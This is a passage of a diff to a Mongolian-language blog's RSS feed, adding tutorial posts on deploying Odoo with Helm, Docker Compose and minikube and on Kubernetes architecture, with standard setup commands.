+</span></span><span style="display:flex;"><span>  export ODOO_PASSWORD<span style="color:#f92672">=</span><span style="color:#66d9ef">$(</span>kubectl get secret --namespace default my-release-odoo -o jsonpath<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;{.data.odoo-password}&#34;</span> | base64 --decode<span style="color:#66d9ef">)</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  echo Email   : $ODOO_EMAIL
+</span></span><span style="display:flex;"><span>  echo Password: $ODOO_PASSWORD
+</span></span></code></pre></div><p>Output нь ойлгоход хялбар энгийн зааварчилгаа байгаа, терминал дээр зааврын дагуу хуулж ажилууллна.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>kubectl get svc --namespace default -w my-release-odoo
+</span></span></code></pre></div><p>Сервисын статусыг дээрх коммандаар харах боломжтой гэж output дээр тайлбарлсан байгаа. Гэхдээ локал орчинд minikube ашиглаж байгаа үед Load Balancer-н экстернал ip -г авч болохгүй шалтгаан нь Cloud Provider-ууд дээр байдаг шиг Minikube -д ѳѳрт нь Load Balancer layer - байхгүй.</p>
+<p>Тиймээс minikube-д экстернал ip-г түр зүүр нээх хэрэгтэй болно. Доор байгаа коммандыг шинэ терминал нээгээд ажилууллна.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>minikube tunnel
+</span></span></code></pre></div><p>Ажилуулах үед нууц үг асууна. Нууц үг хийснээр локал орчинд Load Balancer шинээр үүсгэнэ.</p>
+<p>Эсхүл service.type -г <code>LoadBalancer</code> биш <code>NodePort</code> болгоод ажилуулах бас нэг арга бий. Жишээ нь:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>helm install odoo bitnami/odoo --set serviceType<span style="color:#f92672">=</span>NodePort
+</span></span></code></pre></div><p><code>kubectl get svc --namespace default -w my-release-odoo</code> - г коммандыг дахин ажилууллаад үзээрэй. Экстернал IP хэсгийг тодорхойлсон байгаа. Одоо <code>SERVICE_IP</code> -г browser дээр хуулаад done.</p>
+<h3 id="под-статус-шалгах">Под статус шалгах</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>kubectl get pods
+</span></span></code></pre></div><h3 id="release-устгаж-цэвэрлэх">release устгаж цэвэрлэх</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>helm uninstall my-release
+</span></span></code></pre></div><p>Сервисийн параметруудыг ѳѳрчлѳх конфиг хийх бол <a href="https://github.com/bitnami/charts/tree/master/bitnami/odoo#service-parameters">эндээс</a> харж болох юм байна. Ѳѳр олон тохихруулга байгаа  болохоор <a href="https://github.com/bitnami/charts/tree/master/bitnami/odoo">заавартай</a> нь танилцаад аваарай.</p>
+<h3 id="сурвалжууд--bookmarks">Сурвалжууд &amp; Bookmarks:</h3>
+<ul>
+<li><a href="https://github.com/helm/helm">https://github.com/helm/helm</a></li>
+<li><a href="https://github.com/bitnami/charts">https://github.com/bitnami/charts</a></li>
+<li><a href="https://github.com/bitnami/charts/tree/master/bitnami/odoo">https://github.com/bitnami/charts/tree/master/bitnami/odoo</a></li>
+<li><a href="https://docs.bitnami.com/kubernetes/get-started-kubernetes/">https://docs.bitnami.com/kubernetes/get-started-kubernetes/</a></li>
+</ul>
+]]></content:encoded>
     </item>
     <item>
       <title>Minikube болон kubectl суулгах</title>
@@ -47,6 +648,34 @@
       <pubDate>Tue, 12 Jan 2021 00:00:00 +0000</pubDate>
       <guid>https://cadil.github.io/posts/2021-01-12-kubernetes-install/</guid>
       <description>Minikube болон kubectl суулгах</description>
+      <content:encoded><![CDATA[<h2 id="minikube-болон-kubectl-суулгах">Minikube болон kubectl суулгах</h2>
+<p><code>Minikube</code> ашиглан локал Kubernetes Cluster үүсгэх үзье. Эхлээд minikube суулгана.</p>
+<h3 id="minikube-суулгахдаа">Minikube суулгахдаа:</h3>
+<p>Lunix:
+Binary:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span> curl -LO https://storage.googleapis.com/minikube/releases/latest/minikube-linux-amd64
+</span></span><span style="display:flex;"><span> sudo install minikube-linux-amd64 /usr/local/bin/minikube
+</span></span></code></pre></div><p>Debain Package:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>curl -LO https://storage.googleapis.com/minikube/releases/latest/minikube_latest_amd64.deb
+</span></span><span style="display:flex;"><span>sudo dpkg -i minikube_latest_amd64.deb
+</span></span></code></pre></div><p>MacOS:
+<a href="https://brew.sh">Homebrew</a> ашиглан суулгана.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>brew install minikube
+</span></span></code></pre></div><p>Бусад OS болон дэлгэрэнгүйг <a href="https://minikube.sigs.k8s.io/docs/start/">эндээс</a> ороод танилцаарай.</p>
+<h3 id="kubectl-суулгахдаа">Kubectl суулгахдаа:</h3>
+<p><code>kubectl</code> нь Kubernetes-н Command Line Tool ба cluster инспект хийх лог шалгах deploy хийх зэрэг бүхий л хэрэгтэй коммандууд ажилууллна. <a href="https://kubernetes.io/docs/reference/kubectl/overview/">Дэлгэрэнгүй</a></p>
+<h3 id="minikube-асаах">Minikube асаах:</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>minikube start
+</span></span></code></pre></div><p>MacOS дээр асаж буй лог:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>😄  minikube v1.15.1 on Darwin 10.15.7
+</span></span><span style="display:flex;"><span>✨  Using the hyperkit driver based on existing profile
+</span></span><span style="display:flex;"><span>👍  Starting control plane node minikube in cluster minikube
+</span></span><span style="display:flex;"><span>🔄  Restarting existing hyperkit VM <span style="color:#66d9ef">for</span> <span style="color:#e6db74">&#34;minikube&#34;</span> ...
+</span></span><span style="display:flex;"><span>    ... 
+</span></span><span style="display:flex;"><span>🏄  Done! kubectl is now configured to use <span style="color:#e6db74">&#34;minikube&#34;</span> cluster and <span style="color:#e6db74">&#34;default&#34;</span> namespace by default
+</span></span></code></pre></div><h3 id="minikube-унтраах">Minikube унтраах:</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>minikube stop
+</span></span></code></pre></div>]]></content:encoded>
     </item>
     <item>
       <title>Күбернетес Орчин</title>
@@ -54,6 +683,20 @@
       <pubDate>Mon, 11 Jan 2021 00:00:00 +0000</pubDate>
       <guid>https://cadil.github.io/posts/2021-01-11-kubernetes-environment/</guid>
       <description>Күбернетес нь Cloud дэх кластер дээр түлхүү ажиллана. Гэхдээ ѳѳр олон тѳрлийн орчин байж болох байх.</description>
+      <content:encoded><![CDATA[<h2 id="күбернетес-орчин">Күбернетес Орчин</h2>
+<p>Хѳгжүүлэгч нарт илүү хѳнгѳн орчин, локал дээр ажиллах, тестийн орчин гэх мэт орчнуудад зориулан гаргасан хувилбарууд байна:</p>
+<ul>
+<li>
+<p><a href="https://k3s.io">k3s</a>-н илүү хѳнгѳн бүтэцтэй болохоор Күбернетесд хэрэггүй гэсэн зүйлсийг хасаад зѳвхѳн чухал зүйлсийг авсан хувилбар байна. Яагаад ийм хувилбар хэрэгтэй болсон бэ гэхээр IoT, ARM суурьт CPU дээр ажиллах үед хѳнгѳн бүтэцтэй байхад хялбар ажиллагаа хурд чухал. Олон Raspberry Pi-г нэгтгээд тус тусд нь кластер болгоё гэж үзвэл k8s(Kubernetes)-с илүү k3s илүү тохиромжтой.</p>
+</li>
+<li>
+<p><a href="https://kind.sigs.k8s.i">Kind</a> нь локал орчинд Kubernetes турших, хийсвэр кластер үүсгэх, хѳгжүүлэлт, туршилт хийх үед ашиглана.</p>
+</li>
+<li>
+<p><a href="https://github.com/kubernetes/minikube">Minikube</a> - Kind-тай адилхан локал орчинд Күбернетесийг кластер дээр ажилууллах. Load Balancer, VM, container, docker, external ip, internal ip, tunnel гээд бүгдийг Күбернетес орчинд зориулад single node үүсгэнэ.</p>
+</li>
+</ul>
+]]></content:encoded>
     </item>
     <item>
       <title>Күбернетес тухай</title>
@@ -61,6 +704,110 @@
       <pubDate>Fri, 08 Jan 2021 00:00:00 +0000</pubDate>
       <guid>https://cadil.github.io/posts/2021-01-09-kubernetes-history/</guid>
       <description>2014 оны дунд үеэс Google-н Borg систем дээрээс суурь тавигдаж тухайн үедээ уг тѳсѳл дээр ажиллаж байсан хѳгжүүлэгч нар нэгдэн цааш хѳгжүүлэлт хийсэн байна.</description>
+      <content:encoded><![CDATA[<h2 id="күбернетес-түүхээс">Күбернетес түүхээс</h2>
+<p>2014 оны дунд үеэс Google-н <a href="https://en.wikipedia.org/wiki/Borg_(cluster_manager)">Borg</a> систем дээрээс суурь тавигдаж тухайн үедээ уг тѳсѳл дээр ажиллаж байсан хѳгжүүлэгч нар нэгдэн цааш хѳгжүүлэлт хийсэн байна. Google дэх уг тѳслийн анхдагч нэр Project 7 буюу Star Trek кинон дээрх зохиол дүрүүдийн хэсгээс нэр, логон санаа гарсан юм байна. Күбернетес цааш жѳгжүүлэлтийн явцад C++ хэлээс Go хэл рүү шилжин Kubernetes &ldquo;v1&rdquo; 2015 оны 7-р сард 10-нд release-ээ анх гарчээ.</p>
+<h2 id="күбернетес-гэж-юу-вэ">Күбернетес гэж юу вэ?</h2>
+<p>Товчоор Күбернетес нь контейнеруудыг удирдан зохион байгуулж кластер(ууд) доторх апплкэйшнг өргөтгөл хийх автоматжуулалт. Продакшн орчинг дагаад Хѳгжүүлэлтийн орчин автомэйшн хийгдэнэ (<a href="https://travis-ci.org">Travis</a>, <a href="https://github.com/features/actions">Github Actions</a>, <a href="https://www.jenkins.io">Jenkins</a> гэх мэт нэмэлт CI хэрэглэх байх).</p>
+<figure>
+    <img loading="lazy" src="/images/kubernetes-control-plane.png"/> 
+</figure>
+
+<blockquote>
+<p><strong>Сурвалж</strong>: Kubernetes documentation</p>
+</blockquote>
+<h3 id="master-node-aka-control-plane">Master Node (aka: Control Plane)</h3>
+<p>CLI, клинентаас илгээгдэж байгаа ѳгѳгдлүүд API - гаар дамжин Мастер node -д ирэн шийдвэрлэгдэнэ. Мастер Node -г ажиллагааг дэлгэрүүлбэл:</p>
+<ul>
+<li>kube-apiserver</li>
+<li>etcd</li>
+<li>kube-controller-manager</li>
+<li>kube-scheduler</li>
+</ul>
+<p>Бүтцийн дагуу задлан авч үзвэл:</p>
+<ul>
+<li><code>kube-apiserver</code>: Күбернетес кластер доторх хүсэлтийг зохицуулан шийдвэрлэнэ. Жишээ нь под, репликас тохируулга, ѳргѳтгѳлүүд <code>kube-scheduler</code>, <code>kube-controller-manager</code> ирсэн хүсэлтүүд Күбернетес API серверээр дамжин кластер дах шинэчлэл ѳѳрчлѳлтийг хийж гүйцэтгэнэ.</li>
+</ul>
+<figure>
+    <img loading="lazy" src="/images/kube-apiserver.png"/> 
+</figure>
+
+<ul>
+<li><a href="https://etcd.io"><code>etcd</code></a>: Key Value Store нь kubernetes - тэй хоршиж ажиллахдаа кластер(ууд)-т ѳгѳгдлийг хадаглах backend ажиллагааг хангана.</li>
+</ul>
+<p>Доорх жишээнд мастер node дотор ectd -г под хэлбэрээр хоршин ажиллаж байна.</p>
+<figure>
+    <img loading="lazy" src="/images/kubernetes-etcd-stacked.png"/> 
+</figure>
+
+<blockquote>
+<p><strong>Сурвалж</strong>: Kubernetes documentation</p>
+</blockquote>
+<p>Доорх жишээнд ectd -г экстернал кластер болгон мастер node - тэй хоршин ажиллаж байна. Ингэснээр хамгаалалт болон ѳргѳтгѳл хийхэд гэх мэт илүү уян хатан тѳлѳвтэй болно.</p>
+<figure>
+    <img loading="lazy" src="/images/kubernetes-etcd-external-cluster.png"/> 
+</figure>
+
+<blockquote>
+<p><strong>Сурвалж</strong>: Kubernetes documentation</p>
+</blockquote>
+<p>Под үүсгэж буй ажиллагааг харуулсан зураг. Etcd - ажиллагааг ойлгоход хялбар зураг</p>
+<figure>
+    <img loading="lazy" src="/images/Kubernetes-create-pod.png"/> 
+</figure>
+
+<blockquote>
+<p><strong>Сурвалж</strong>: blog.heptio.com</p>
+</blockquote>
+<ul>
+<li><a href="https://kubernetes.io/docs/reference/command-line-tools-reference/kube-controller-manager/"><code>kube-controller-manager</code></a>: Системийн хэвийн ажиллаж байгаа эсэхийг давтамжтайгаар шалгах процесс.</li>
+<li><a href="https://kubernetes.io/docs/concepts/scheduling-eviction/kube-scheduler/"><code>kube-scheduler</code></a>: Күбернетес хуваарилагч нь аль под аль node руу хуваарилагдан очих ёстойг тодорхойлно. Хуваарилагчаас тодорхойлсон бүтцийн дагуу <code>kubelet</code> цааш хариуцан зѳѳвѳрлѳх үйлдийг хийнэ.</li>
+</ul>
+<h3 id="worker-node">Worker Node</h3>
+<figure>
+    <img loading="lazy" src="/images/Kubernetes-worker-node.png"/> 
+</figure>
+
+<ul>
+<li>kubelet</li>
+<li>kube-proxy</li>
+<li>Container runtime</li>
+</ul>
+<p><code>kubelet</code>: Подтой холбогдон контейнер(ууд) хэвийн ажиллаж байгааг хянах, ажилууллах үйлдлийг API серверээр дамжуулан мастер node-тэй холбож ѳгдѳг. Ѳѳрѳѳр хэлбэл worker node-ыг мастер node-тэй холбох зуучлагч юм.</p>
+<p><code>kube-proxy</code>: Сервис дээр worker node тус бүр дээр load balancer (ачаалал тэнцвэржүүлэгч) хийж IP хаяг болон сүлжээний урсгалыг зохицуулдаг.</p>
+<p><code>Container runtime</code>: Контейнерын lifecycle-г тодорхойлж байдаг. <a href="https://github.com/kubernetes/community/blob/master/contributors/devel/sig-node/container-runtimenter-iface.md">Күбернетэс CRI</a> нэвтрүүлж контейнерийн runtime-уудыг дэмжин ажиллана. Үүнд Docker, containerd, <a href="https://cri-o.io/#what-is-cri-o">CRI-O</a> гэх мэт.</p>
+<p><code>Под</code>: Кластер дотор нэг эсхүл олон контейнеруудаас бүрдэн ажиллаж байгаа системийн илэрхийлэл бол под юм.</p>
+<figure>
+    <img loading="lazy" src="/images/Kubernetes-101-Pod.png"/> 
+</figure>
+
+<ul>
+<li>Нэг подод нэг контейнер</li>
+<li>Олон подод олон контейнерууд</li>
+</ul>
+<p>Под доторх контейнер(ууд) ѳѳрийн нѳѳц, нетворкийг хуваалцан ашиглана. Ѳѳрѳѳр хэлбэл нэг эсхүл олон контейнеруудыг холбон нэг подод оруулан (контейнерууд) хоорондоо холбогдон үйлдэл хийх боломжтой тусгаарлагдсан орчин үүсгэнэ.</p>
+<h2 id="сурвалжууд--bookmarks">Сурвалжууд &amp; Bookmarks</h2>
+<ul>
+<li><a href="https://etcd.io/">https://etcd.io/</a></li>
+<li><a href="https://github.com/k3s-io/k3s">https://github.com/k3s-io/k3s</a></li>
+<li><a href="https://www.ibm.com/cloud/blog/kubernetes-ingress">https://www.ibm.com/cloud/blog/kubernetes-ingress</a></li>
+<li><a href="https://k3s.io/">https://k3s.io/</a></li>
+<li><a href="https://kind.sigs.k8s.io/">https://kind.sigs.k8s.io/</a></li>
+<li><a href="https://kubernetes.io/docs/concepts/services-networking/ingress/">https://kubernetes.io/docs/concepts/services-networking/ingress/</a></li>
+<li><a href="https://kubernetes.io/docs/tasks/configure-pod-container/configure-liveness-readiness-startup-probes/#configure-probes">https://kubernetes.io/docs/tasks/configure-pod-container/configure-liveness-readiness-startup-probes/#configure-probes</a>)</li>
+<li><a href="https://kubernetes.io/docs/tasks/tools/">https://kubernetes.io/docs/tasks/tools/</a></li>
+<li><a href="https://medium.com/@tumenzul/kubernetes-%D0%BD-%D0%B0%D0%B6%D0%B8%D0%BB%D0%BB%D0%B0%D0%B3%D0%B0%D0%B0%D0%BD%D1%8B-%D0%B7%D0%B0%D1%80%D1%87%D0%BC%D1%8B%D0%B3-%D0%BE%D0%B9%D0%BB%D0%B3%D0%BE%D1%85-%D0%BD%D1%8C-abc9c0b82d35">https://medium.com/@tumenzul/kubernetes-%D0%BD-%D0%B0%D0%B6%D0%B8%D0%BB%D0%BB%D0%B0%D0%B3%D0%B0%D0%B0%D0%BD%D1%8B-%D0%B7%D0%B0%D1%80%D1%87%D0%BC%D1%8B%D0%B3-%D0%BE%D0%B9%D0%BB%D0%B3%D0%BE%D1%85-%D0%BD%D1%8C-abc9c0b82d35</a></li>
+<li><a href="https://medium.com/better-programming/a-closer-look-at-etcd-the-brain-of-a-kubernetes-cluster-788c8ea759a5">https://medium.com/better-programming/a-closer-look-at-etcd-the-brain-of-a-kubernetes-cluster-788c8ea759a5</a></li>
+<li><a href="https://medium.com/faun/what-is-a-kubernetes-pod-67215193ed98">https://medium.com/faun/what-is-a-kubernetes-pod-67215193ed98</a></li>
+<li><a href="https://medium.com/google-cloud">https://medium.com/google-cloud</a></li>
+<li><a href="https://medium.com/google-cloud/understanding-kubernetes-networking-pods-7117dd28727">https://medium.com/google-cloud/understanding-kubernetes-networking-pods-7117dd28727</a></li>
+<li><a href="https://medium.com/jorgeacetozi/kubernetes-master-components-etcd-api-server-controller-manager-and-scheduler-3a0179fc8186">https://medium.com/jorgeacetozi/kubernetes-master-components-etcd-api-server-controller-manager-and-scheduler-3a0179fc8186</a></li>
+<li><a href="https://medium.com/swlh/kubernetes-architecture-explained-in-brief-6a07f59193e">https://medium.com/swlh/kubernetes-architecture-explained-in-brief-6a07f59193e</a></li>
+<li><a href="https://mn.wikipedia.org/wiki/Load_balancing">https://mn.wikipedia.org/wiki/Load_balancing</a></li>
+<li><a href="https://bells17.medium.com/kubernetes-ccm-d4d3c71ba523">https://bells17.medium.com/kubernetes-ccm-d4d3c71ba523</a></li>
+<li><a href="https://www.cncf.io/blog/2020/12/14/kubernetes-101-an-introduction/">https://www.cncf.io/blog/2020/12/14/kubernetes-101-an-introduction/</a></li>
+<li><a href="https://github.com/kodekloudhub/certified-kubernetes-administrator-course">https://github.com/kodekloudhub/certified-kubernetes-administrator-course</a></li>
+</ul>
+]]></content:encoded>
     </item>
     <item>
       <title>Odoo -г Docker-с ажилууллах</title>
@@ -68,6 +815,123 @@
       <pubDate>Fri, 25 Dec 2020 00:00:00 +0000</pubDate>
       <guid>https://cadil.github.io/posts/2020-12-25-docker-compose/</guid>
       <description>Odoo -г Docker-с ажилууллах</description>
+      <content:encoded><![CDATA[<h3 id="odoo--г-docker-с-ажилууллах">Odoo -г Docker-с ажилууллах</h3>
+<ul>
+<li><code>Odoo</code> -н тухай</li>
+<li><a href="https://bitnami.com">Bitnami</a>-г ашиглан <a href="https://github.com/bitnami/bitnami-docker-odoo">Bitnami-docker-odoo</a> - ажилууллах</li>
+<li><code>docker-compose</code> - коммандын талаар</li>
+<li>Docker Volume &amp; persistent volume claim талаар</li>
+<li>Docker-compouse ажилууллах</li>
+</ul>
+<h3 id="odoohttpsgithubcomodooodoo-н-тухайд"><a href="https://github.com/odoo/odoo">Odoo</a>-н тухайд</h3>
+<p>Нээлттэй эх дээрх бизнес апплкэйшн <a href="https://en.wikipedia.org/wiki/Enterprise_resource_planning">ERP</a> нь вэб дээр бүрэн ажиллах, ѳѳр системтэй интеграци хийх боломж, <a href="https://en.wikipedia.org/wiki/Internationalization_and_localization">l10n</a> зэргийг шийдсэн цогц апплкэйшн юм.</p>
+<h3 id="bitnamihttpsgithubcombitnami-н-тухайд"><a href="https://github.com/bitnami">Bitnami</a>-н тухайд</h3>
+<p>Нээлттэй эх дээр суурьтай <a href="https://en.wikipedia.org/wiki/Open-source_software">OSS</a> софтвейрыг хялбар аргаар хүссэн орчин дээр суулган ажилуулна. Клоуд хостинг хийж байгаа бол Helm Chart -г ашиглан күбэрнетес, клустер-г хялбархан тохируулна. Гэхдээ күбэрнетес, клустертэй ажиллаж байгаа үед гарын авлага, документ, тест зэргийг сайтар судалсны дараа турших хэрэгтэй.</p>
+<h3 id="docker-compose">Docker Compose</h3>
+<p>Compose нь нэгээс олон контейнеруудыг нэг дор ажилууллах үед <a href="https://en.wikipedia.org/wiki/YAML">YAML</a> файл дотор тохируулсан бүтцийг ашиглан докер ажиллах процесс юм.</p>
+<p>Докэр Compose үндсэн бүтэц:</p>
+<ul>
+<li><code>Dockerfile</code></li>
+<li><code>docker-compose.yml</code> - апплкэйшн тус бүрийн бүтцийг тодорхойлох хэсэг. Файл дотор байгаа бүтцийн дагуу апплкэйшн серверүүдийг асааж тусгаарлагдсан орчин үүсгэнэ.</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>version: <span style="color:#e6db74">&#39;2&#39;</span>
+</span></span><span style="display:flex;"><span>services:
+</span></span><span style="display:flex;"><span> postgresql:
+</span></span><span style="display:flex;"><span>   image: <span style="color:#e6db74">&#39;docker.io/bitnami/postgresql:11-debian-10&#39;</span>
+</span></span><span style="display:flex;"><span>   environment:
+</span></span><span style="display:flex;"><span>     - ALLOW_EMPTY_PASSWORD<span style="color:#f92672">=</span>yes
+</span></span><span style="display:flex;"><span>   volumes:
+</span></span><span style="display:flex;"><span>     - <span style="color:#e6db74">&#39;postgresql_data:/bitnami/postgresql&#39;</span>
+</span></span><span style="display:flex;"><span> odoo:
+</span></span><span style="display:flex;"><span>   image: <span style="color:#e6db74">&#39;docker.io/bitnami/odoo:14-debian-10&#39;</span>
+</span></span><span style="display:flex;"><span>   ports:
+</span></span><span style="display:flex;"><span>     - <span style="color:#e6db74">&#39;80:8069&#39;</span>
+</span></span><span style="display:flex;"><span>     - <span style="color:#e6db74">&#39;443:8071&#39;</span>
+</span></span><span style="display:flex;"><span>   volumes:
+</span></span><span style="display:flex;"><span>     - <span style="color:#e6db74">&#39;odoo_data:/bitnami&#39;</span>
+</span></span><span style="display:flex;"><span>   depends_on:
+</span></span><span style="display:flex;"><span>     - postgresql
+</span></span><span style="display:flex;"><span>volumes:
+</span></span><span style="display:flex;"><span> postgresql_data:
+</span></span><span style="display:flex;"><span>   driver: local
+</span></span><span style="display:flex;"><span> odoo_data:
+</span></span><span style="display:flex;"><span>   driver: local
+</span></span></code></pre></div><p>Bitnami дах Odoo V14-н сервер, апплкэйшнг тодорхойлж байгаа docker-compose.yml -г задалж үзвэл <a href="https://github.com/bitnami/bitnami-docker-postgresql"><code>postgresql</code></a>, <code>odoo</code> гэсэн хоёр контейнераас <code>services</code> бүрдэж байна.</p>
+<ul>
+<li><code>ALLOW_EMPTY_PASSWORD=yes</code> - ѳгѳгдлийн санг нууц үггүйгээр хандалт хийдэг болгож байна (тест хийж байгаа үед тохиромжтой). Продакшн орчинд тохиромжгүй сонголт.</li>
+<li><code>ports</code> - [host-port]:[container-port] Хостинг портыг <code>80</code>, <code>443</code> контейнер дэх <code>8069</code>, <code>8071</code> порттой холбож байна. CLI - рүү бичвэл:</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ docker run -p 80:8069 --name odoo
+</span></span></code></pre></div><ul>
+<li><code>depends_on</code> - Compose хийхдээ эхлээд postgresql тодорхойлсон байна. Үүний дараа Odoo-г тохируулж байна. Ингэснээр ялгаатай хоёр контейнерээс хамааралтай байх нѳхцлийг тодорхойлж ѳгнѳ. Ѳѳрѳѳр хэлбэл нетворкинг хийж байгаа үед дарааллыг тодорхойлж ѳгѳх ба Odoo асахаас ѳмнѳ нь заавал Postgresql ассан байх ёстойг compose-д сануулж байна гэж хэлж болох юм.</li>
+<li><code>volumes</code> - compose хийгдэж байгаа YAML-г CLI -руу хѳрвүүлбэл:</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ docker volume create --driver local --name postgresql_data
+</span></span><span style="display:flex;"><span>$ docker volume create --driver local --name odoo_data
+</span></span></code></pre></div><p>буюу [Докэр хост] дотор odoo_data, postgresql_data гэсэн нэртэй local volume үүсгэж ѳгнѳ. Докэр хост-г дэлгэрүүлбэл:</p>
+<p>Докэр ажиллах бүтэц нь Docker Engine тѳвтэй ба дараах гурван хэсгээс бүрдэнэ.</p>
+<ul>
+<li>Docker daemon - Docker API хүсэлтүүд хүлээн авч image, container, network, volume - зэргийн зохион байгуулалт хийх, бусад Docker Service-үүдтэй deamon -ѳѳр дамжин холбогдох гэх мэт.</li>
+<li>Docker CLI (Command Line Interface)</li>
+<li>REST API - Клиенттай холбогдох, Docker deamon-той уялдан харилцана.</li>
+</ul>
+<p>Ѳѳрѳѳр хэлбэл докэр дотор ажиллаж байгааг image-с тусад нь volume үүсгэн ѳгч байна. Ингэснээр тухайн контейнер унтарсан ч дата персист тѳлѳвтэй дахин ашиглаж болно гэсэн юм. &ndash;driver гэдэг нь Докэр plugin ашиглаад зѳвхѳн Докэр роот-с хандалт хийх эрх локал volume үүсгэж байна. Датаг холбох ѳѳр нэг арга нь docker-compose дотор хостинг directory-г оноох боломжтой. Гэхдээ non-root хэрэглэгчийн хувьд харгалзах хандах эрх байгааг нягтлан шалгах хэрэгтэй. Жишээ нь хост direcory-г тодорхойж буй:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>volumes:
+</span></span><span style="display:flex;"><span>  - <span style="color:#e6db74">&#39;odoo_data:/bitnami&#39;</span> <span style="color:#75715e">#Docker Host-с дотор тодорхойлсон volume.</span>
+</span></span><span style="display:flex;"><span>  - <span style="color:#e6db74">&#39;./extra-addons:/bitnami/odoo/addons&#39;</span> <span style="color:#75715e"># Хост directory-г Container руу оруулж байна.</span>
+</span></span></code></pre></div><p><code>odoo_data:/bitnami</code> дотор Odoo-г ажиллаж байх үеийн filestore -д Docker Host дотор <code>odoo_data</code> volume-д үүснэ. Docker volume руу зѳвхѳн Docker hosting хийж байгаа root хэрэглэгч хандах боломжтойг анхаарна уу.</p>
+<p><code>./extra-addons:/bitnami/odoo/addons</code> - ./extra-addons, directory -г Odoo контейнер дах /bitnami/odoo/addons руу оруулж байна. Ингэснээр гуравдагч эдгээдийн модиуль болон хѳгжүүлэлтийн орчин дах нэмэлт модиулыг суулган ажиллуулах боломжтой болно.</p>
+<p><code>/bitnami/odoo/addons</code>-г conf файл дотор тодорхойлж ѳгсѳн эсэхийг шалгах:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ docker exec -it &lt;container-name&gt; cat /opt/bitnami/odoo/odoo-server.conf
+</span></span></code></pre></div><p>Bitnami -г дах Dockerfile болон нэмэлт pkg суух үед Odoo-гийн коор модиулидын directory болон нэмэлтээр суулгах модиулын directory-г тодорхойлон .conf файлд тохируулсан байгааг харж болно.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#f92672">[</span>options<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>addons_path <span style="color:#f92672">=</span> /opt/bitnami/odoo/odoo/addons,/opt/bitnami/odoo/addons
+</span></span><span style="display:flex;"><span>...
+</span></span></code></pre></div><p>docker-compose.yml - файл сүүлийн байдлаар:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>version: <span style="color:#e6db74">&#39;2&#39;</span>
+</span></span><span style="display:flex;"><span>services:
+</span></span><span style="display:flex;"><span>  postgresql:
+</span></span><span style="display:flex;"><span>    image: <span style="color:#e6db74">&#39;docker.io/bitnami/postgresql:11-debian-10&#39;</span>
+</span></span><span style="display:flex;"><span>    environment:
+</span></span><span style="display:flex;"><span>      - ALLOW_EMPTY_PASSWORD<span style="color:#f92672">=</span>yes
+</span></span><span style="display:flex;"><span>    volumes:
+</span></span><span style="display:flex;"><span>      - <span style="color:#e6db74">&#39;postgresql_data:/bitnami/postgresql&#39;</span>
+</span></span><span style="display:flex;"><span>  odoo:
